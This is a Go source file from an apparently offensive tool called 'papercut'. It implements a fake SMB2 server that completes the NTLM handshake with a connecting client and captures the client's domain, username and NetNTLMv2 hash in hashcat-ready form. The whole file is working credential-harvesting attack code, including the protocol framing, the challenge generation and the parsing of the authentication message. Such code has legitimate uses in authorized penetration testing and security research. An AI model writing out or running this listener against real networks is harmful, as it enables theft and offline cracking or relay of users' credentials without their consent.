package listener

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"papercut/internal/output"
)

// SMB2 constants
const (
	smbHeaderLen    = 64
	smb2Magic       = "\xFESMB"
	smbNegotiate    = 0x0000
	smbSessionSetup = 0x0001
)

// SMB2 status codes
const (
	statusSuccess              = 0x00000000
	statusMoreProcessing       = 0xC0000016
)

// SMBCreds holds captured SMB authentication credentials.
type SMBCreds struct {
	SourceIP string
	Domain   string
	Username string
	Password string // populated for plaintext auth (rare)
	NTLMHash string // NetNTLMv2 hash in hashcat format
	HashType string // "NetNTLMv2", "NetNTLMv1", "Plaintext"
}

// ListenSMB starts a TCP listener on addr (host:port), waits for one incoming
// SMB2 connection with NTLM authentication, captures credentials, then returns.
// It blocks until credentials are received or the context/timeout expires.
func ListenSMB(ctx context.Context, addr string, timeout time.Duration, verbose bool) (*SMBCreds, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer ln.Close()

	// Close listener when context is cancelled
	go func() {
		<-ctx.Done()
		ln.Close()
	}()

	// Set accept deadline based on timeout
	if tcpLn, ok := ln.(*net.TCPListener); ok {
		tcpLn.SetDeadline(time.Now().Add(timeout))
	}

	conn, err := ln.Accept()
	if err != nil {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("cancelled while waiting for SMB connection")
		default:
			return nil, fmt.Errorf("accept: %w", err)
		}
	}
	defer conn.Close()

	sourceIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(sourceIP); err == nil {
		sourceIP = host
	}

	if verbose {
		output.Info("SMB connection received from %s", sourceIP)
	}

	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	// Generate server GUID
	serverGUID := make([]byte, 16)
	rand.Read(serverGUID)

	// Generate challenge for NTLM
	serverChallenge, err := GenerateServerChallenge()
	if err != nil {
		return nil, err
	}

	// SMB2 handshake loop
	for {
		// Read NetBIOS session header (4 bytes: type + 3-byte length)
		nbHeader := make([]byte, 4)
		if _, err := io.ReadFull(conn, nbHeader); err != nil {
			return nil, fmt.Errorf("read NetBIOS header from %s: %w", sourceIP, err)
		}

		msgLen := int(nbHeader[1])<<16 | int(nbHeader[2])<<8 | int(nbHeader[3])
		if msgLen == 0 || msgLen > 65535 {
			return nil, fmt.Errorf("invalid SMB message length %d from %s", msgLen, sourceIP)
		}

		// Read the full SMB2 message
		msg := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, msg); err != nil {
			return nil, fmt.Errorf("read SMB message from %s: %w", sourceIP, err)
		}

		// Verify SMB2 magic
		if len(msg) < smbHeaderLen {
			return nil, fmt.Errorf("SMB message too short (%d bytes) from %s", len(msg), sourceIP)
		}
		if string(msg[:4]) != smb2Magic {
			return nil, fmt.Errorf("invalid SMB2 magic from %s", sourceIP)
		}

		// Parse SMB2 header
		command := binary.LittleEndian.Uint16(msg[12:14])
		messageID := binary.LittleEndian.Uint64(msg[24:32])

		if verbose {
			output.Info("SMB2 command: 0x%04x, messageID: %d", command, messageID)
		}

		switch command {
		case smbNegotiate:
			// Respond with SMB2 Negotiate Response
			resp := buildSMB2NegotiateResponse(messageID, serverGUID)
			sendSMB2(conn, resp)

			if verbose {
				output.Info("SMB2 Negotiate → sent response")
			}

		case smbSessionSetup:
			// Parse the Session Setup request to get the NTLMSSP token
			secBlob := extractSessionSetupSecurityBlob(msg)
			if secBlob == nil {
				return nil, fmt.Errorf("no security blob in session setup from %s", sourceIP)
			}

			// Check if it contains NTLMSSP
			ntlmData := extractNTLMSSP(secBlob)
			if ntlmData == nil {
				return nil, fmt.Errorf("no NTLMSSP in session setup from %s", sourceIP)
			}

			msgType := ParseNTLMType(ntlmData)

			switch msgType {
			case ntlmNegotiate:
				// Type 1 → respond with Type 2 (challenge)
				challengeMsg := BuildNTLMChallenge(serverChallenge)
				resp := buildSMB2SessionSetupResponse(messageID, statusMoreProcessing, challengeMsg)
				sendSMB2(conn, resp)

				if verbose {
					output.Info("NTLM negotiate received, sent challenge")
				}

			case ntlmAuthenticate:
				// Type 3 → extract credentials
				auth, err := ParseNTLMAuth(ntlmData)
				if err != nil {
					return nil, fmt.Errorf("parse NTLM auth from %s: %w", sourceIP, err)
				}

				// Send success response
				resp := buildSMB2SessionSetupResponse(messageID, statusSuccess, nil)
				sendSMB2(conn, resp)

				hashStr := NTLMHashString(auth, serverChallenge)
				hashType := NTLMHashType(auth)

				creds := &SMBCreds{
					SourceIP: sourceIP,
					Domain:   auth.Domain,
					Username: auth.Username,
					NTLMHash: hashStr,
					HashType: hashType,
				}

				if verbose {
					output.Info("NTLM auth: %s\\%s (%s)", auth.Domain, auth.Username, hashType)
				}

				return creds, nil

			default:
				return nil, fmt.Errorf("unexpected NTLMSSP message type %d from %s", msgType, sourceIP)
			}

		default:
			// Respond with error for unhandled commands
			if verbose {
				output.Info("Unhandled SMB2 command 0x%04x, ignoring", command)
			}
		}
	}
}

// sendSMB2 wraps an SMB2 message in a NetBIOS session header and sends it.
func sendSMB2(conn net.Conn, msg []byte) {
	nbHeader := make([]byte, 4)
	nbHeader[0] = 0x00
	nbHeader[1] = byte(len(msg) >> 16)
	nbHeader[2] = byte(len(msg) >> 8)
	nbHeader[3] = byte(len(msg))
	conn.Write(nbHeader)
	conn.Write(msg)
}

// buildSMB2NegotiateResponse builds a minimal SMB2 Negotiate Response.
func buildSMB2NegotiateResponse(messageID uint64, serverGUID []byte) []byte {
	// SMB2 header (64 bytes)
	header := make([]byte, smbHeaderLen)
	copy(header[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(header[4:6], 64)  // StructureSize
	binary.LittleEndian.PutUint16(header[6:8], 0)    // CreditCharge
	binary.LittleEndian.PutUint32(header[8:12], 0)   // Status = SUCCESS
	binary.LittleEndian.PutUint16(header[12:14], smbNegotiate) // Command
	binary.LittleEndian.PutUint16(header[14:16], 1)  // CreditResponse
	binary.LittleEndian.PutUint32(header[16:20], 0x01) // Flags = Response
	binary.LittleEndian.PutUint64(header[24:32], messageID)

	// Negotiate Response body (65 bytes minimum)
	body := make([]byte, 65)
	binary.LittleEndian.PutUint16(body[0:2], 65)    // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], 0x01)  // SecurityMode = signing enabled
	binary.LittleEndian.PutUint16(body[4:6], 0x0202) // DialectRevision = SMB 2.0.2

	copy(body[8:24], serverGUID) // ServerGuid (16 bytes at offset 8)

	// Capabilities (offset 24)
	binary.LittleEndian.PutUint32(body[24:28], 0)
	// MaxTransactSize (offset 28)
	binary.LittleEndian.PutUint32(body[28:32], 65536)
	// MaxReadSize (offset 32)
	binary.LittleEndian.PutUint32(body[32:36], 65536)
	// MaxWriteSize (offset 36)
	binary.LittleEndian.PutUint32(body[36:40], 65536)

	// SecurityBufferOffset (offset 56) = header(64) + body size
	binary.LittleEndian.PutUint16(body[56:58], uint16(smbHeaderLen+65))
	// SecurityBufferLength (offset 58) = 0 (no security blob in negotiate)
	binary.LittleEndian.PutUint16(body[58:60], 0)

	return append(header, body...)
}

// buildSMB2SessionSetupResponse builds an SMB2 Session Setup Response with an optional security blob.
func buildSMB2SessionSetupResponse(messageID uint64, status uint32, securityBlob []byte) []byte {
	// SMB2 header (64 bytes)
	header := make([]byte, smbHeaderLen)
	copy(header[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(header[4:6], 64)   // StructureSize
	binary.LittleEndian.PutUint32(header[8:12], status) // Status
	binary.LittleEndian.PutUint16(header[12:14], smbSessionSetup) // Command
	binary.LittleEndian.PutUint16(header[14:16], 1)   // CreditResponse
	binary.LittleEndian.PutUint32(header[16:20], 0x01) // Flags = Response
	binary.LittleEndian.PutUint64(header[24:32], messageID)

	// Session Setup Response body (9 bytes fixed)
	bodyFixed := make([]byte, 8)
	binary.LittleEndian.PutUint16(bodyFixed[0:2], 9) // StructureSize (always 9 for session setup response)

	// Wrap NTLMSSP in a minimal GSS-API/SPNEGO token if we have a security blob
	var gssBlob []byte
	if securityBlob != nil {
		gssBlob = wrapSPNEGO(securityBlob, status == statusMoreProcessing)
	}

	// SecurityBufferOffset (offset 4)
	secOffset := uint16(smbHeaderLen + 8)
	binary.LittleEndian.PutUint16(bodyFixed[4:6], secOffset)
	// SecurityBufferLength (offset 6)
	binary.LittleEndian.PutUint16(bodyFixed[6:8], uint16(len(gssBlob)))

	result := append(header, bodyFixed...)
	result = append(result, gssBlob...)
	return result
}

// extractSessionSetupSecurityBlob extracts the security blob from an SMB2 Session Setup Request.
func extractSessionSetupSecurityBlob(msg []byte) []byte {
	if len(msg) < smbHeaderLen+24 {
		return nil
	}

	body := msg[smbHeaderLen:]
	if len(body) < 24 {
		return nil
	}

	// Session Setup Request:
	// StructureSize(2) + Flags(1) + SecurityMode(1) + Capabilities(4) + Channel(4) +
	// SecurityBufferOffset(2) + SecurityBufferLength(2) + PreviousSessionId(8)
	secOffset := int(binary.LittleEndian.Uint16(body[12:14]))
	secLen := int(binary.LittleEndian.Uint16(body[14:16]))

	if secOffset == 0 || secLen == 0 {
		return nil
	}

	// Offset is from the beginning of the SMB2 header
	if secOffset+secLen > len(msg) {
		return nil
	}

	return msg[secOffset : secOffset+secLen]
}

// extractNTLMSSP finds the NTLMSSP token within a GSS-API/SPNEGO blob.
// It searches for the NTLMSSP signature directly since we don't need a full ASN.1 parser.
func extractNTLMSSP(data []byte) []byte {
	sig := []byte("NTLMSSP\x00")
	for i := 0; i <= len(data)-len(sig); i++ {
		if string(data[i:i+len(sig)]) == string(sig) {
			return data[i:]
		}
	}
	return nil
}

// wrapSPNEGO wraps an NTLMSSP token in a minimal GSS-API/SPNEGO structure.
// For the initial challenge (isChallenge=true), wraps in a NegTokenResp.
// This is a simplified wrapper that real-world clients accept.
func wrapSPNEGO(ntlmssp []byte, isChallenge bool) []byte {
	if !isChallenge {
		// For the final response, just return the raw NTLMSSP
		return ntlmssp
	}

	// Build a minimal NegTokenResp (SPNEGO) containing the NTLMSSP challenge:
	// SEQUENCE {
	//   [0] CONTEXT { ENUMERATED accept-incomplete (1) }
	//   [1] CONTEXT { OID NTLMSSP }
	//   [2] CONTEXT { OCTET STRING ntlmssp_token }
	// }

	// Context [2] containing the NTLMSSP token as OCTET STRING
	tokenOctet := asn1Wrap(0x04, ntlmssp)         // OCTET STRING
	ctx2 := asn1Wrap(0xa2, tokenOctet)              // [2] CONTEXT

	// Context [1] containing the NTLMSSP OID (1.2.840.113554.1.2.2.10 — SPNEGO NTLM)
	// For simplicity, use the standard NTLM SSP OID: 1.3.6.1.4.1.311.2.2.10
	// Many implementations just omit this and clients still work
	// We include a minimal supportedMech

	// Context [0] containing accept-incomplete (ENUMERATED 1)
	negState := asn1Wrap(0x0a, []byte{0x01})        // ENUMERATED = 1 (accept-incomplete)
	ctx0 := asn1Wrap(0xa0, negState)                 // [0] CONTEXT

	// NegTokenResp SEQUENCE
	inner := append(ctx0, ctx2...)
	negTokenResp := asn1Wrap(0x30, inner)

	// Wrap in [1] CONTEXT (NegTokenResp choice in NegotiationToken)
	return asn1Wrap(0xa1, negTokenResp)
}

// asn1Wrap wraps data in a simple ASN.1 TLV (tag + length + value).
func asn1Wrap(tag byte, data []byte) []byte {
	length := len(data)
	var result []byte
	result = append(result, tag)

	if length < 128 {
		result = append(result, byte(length))
	} else if length < 256 {
		result = append(result, 0x81, byte(length))
	} else {
		result = append(result, 0x82, byte(length>>8), byte(length))
	}

	return append(result, data...)
}
